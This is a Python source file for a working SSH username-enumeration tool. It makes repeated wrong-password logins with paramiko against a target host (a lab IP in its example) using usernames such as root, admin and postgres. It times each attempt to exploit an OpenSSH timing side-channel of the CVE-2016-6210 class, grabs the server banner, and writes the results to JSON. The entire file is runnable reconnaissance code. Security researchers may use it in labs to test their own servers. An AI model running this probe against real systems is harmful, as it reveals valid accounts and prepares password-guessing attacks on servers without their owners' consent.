"""
manual_ssh.py — SSH User Enumeration Probe with Timing Side-Channel Analysis

Methodology:
  For each candidate username, perform N connection attempts and record:
    - precise wall-clock timing from TCP connect → AuthenticationException
    - the exact exception type (AuthenticationException vs NoValidConnectionsError)
    - the SSH banner (version string leaks server info)

  Statistical comparison between "invalid user" and "valid user, wrong password"
  timings can reveal whether OpenSSH is leaking existence via a timing side-channel
  (CVE-2016-6210 class of vulnerabilities).

Usage:
    enumerator = ManualSSHEnumerator("192.168.56.10")
    results = enumerator.test_usernames(
        usernames=["root", "admin", "postgres", "nonexistent999"],
        password="wrongpassword123",
        samples=10
    )
    enumerator.save_results(results)
"""

import time
import json
import socket
import logging
from dataclasses import dataclass, asdict
from typing import List, Optional

import paramiko

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
log = logging.getLogger(__name__)


@dataclass
class ProbeResult:
    username: str
    result: str                  # "auth_failed" | "success" | "connection_error" | "timeout"
    timings_s: List[float]
    mean_s: float
    std_s: float
    min_s: float
    max_s: float
    ssh_banner: Optional[str]
    samples_collected: int
    error_messages: List[str]    # exact exception messages — may differ between valid/invalid users


class ManualSSHEnumerator:
    """
    Probe SSH usernames one-by-one and record per-attempt timing.

    Design note: Uses a fresh SSHClient per attempt (not per username) to avoid
    TCP connection reuse masking the server's per-attempt processing time.
    """

    def __init__(self, target_ip: str, port: int = 22, connect_timeout: int = 10):
        self.target_ip = target_ip
        self.port = port
        self.connect_timeout = connect_timeout
        self._banner_cache: Optional[str] = None

    # ------------------------------------------------------------------
    # Core probe logic
    # ------------------------------------------------------------------

    def test_single_username(
        self, username: str, password: str, samples: int = 10
    ) -> ProbeResult:
        timings: List[float] = []
        error_messages: List[str] = []
        result_type = "unknown"

        for i in range(samples):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            t0 = time.perf_counter()
            try:
                client.connect(
                    self.target_ip,
                    port=self.port,
                    username=username,
                    password=password,
                    timeout=self.connect_timeout,
                    banner_timeout=self.connect_timeout,
                    auth_timeout=self.connect_timeout,
                    look_for_keys=False,
                    allow_agent=False,
                )
                result_type = "success"
            except paramiko.AuthenticationException as exc:
                result_type = "auth_failed"
                msg = str(exc)
                if msg and msg not in error_messages:
                    error_messages.append(msg)
            except (socket.timeout, paramiko.SSHException) as exc:
                result_type = "connection_error"
                error_messages.append(str(exc))
                break
            except Exception as exc:
                result_type = f"error"
                error_messages.append(type(exc).__name__ + ": " + str(exc))
                break
            finally:
                elapsed = time.perf_counter() - t0
                timings.append(elapsed)
                # Cache SSH banner from first successful transport negotiation
                transport = client.get_transport()
                if transport and self._banner_cache is None:
                    self._banner_cache = transport.remote_version
                client.close()

        if not timings:
            return ProbeResult(
                username=username,
                result=result_type,
                timings_s=[],
                mean_s=0.0,
                std_s=0.0,
                min_s=0.0,
                max_s=0.0,
                ssh_banner=self._banner_cache,
                samples_collected=0,
                error_messages=error_messages,
            )

        import statistics as _stats
        mean = sum(timings) / len(timings)
        std = _stats.stdev(timings) if len(timings) > 1 else 0.0

        return ProbeResult(
            username=username,
            result=result_type,
            timings_s=timings,
            mean_s=round(mean, 6),
            std_s=round(std, 6),
            min_s=round(min(timings), 6),
            max_s=round(max(timings), 6),
            ssh_banner=self._banner_cache,
            samples_collected=len(timings),
            error_messages=error_messages,
        )

    def test_usernames(
        self,
        usernames: List[str],
        password: str = "wrongpassword123",
        samples: int = 10,
    ) -> List[ProbeResult]:
        results: List[ProbeResult] = []
        total = len(usernames)
        for idx, username in enumerate(usernames, 1):
            log.info("[%d/%d] Probing username: %s", idx, total, username)
            r = self.test_single_username(username, password, samples=samples)
            log.info(
                "  → result=%-15s  mean=%.4fs  std=%.4fs",
                r.result, r.mean_s, r.std_s,
            )
            results.append(r)
        return results

    # ------------------------------------------------------------------
    # Persistence
    # ------------------------------------------------------------------

    def save_results(
        self,
        results: List[ProbeResult],
        path: str = "data/results/manual-enumeration-results.json",
    ) -> None:
        payload = {
            "target": f"{self.target_ip}:{self.port}",
            "ssh_banner": self._banner_cache,
            "total_usernames_tested": len(results),
            "results": [asdict(r) for r in results],
        }
        with open(path, "w") as fh:
            json.dump(payload, fh, indent=2)
        log.info("Results written to %s", path)
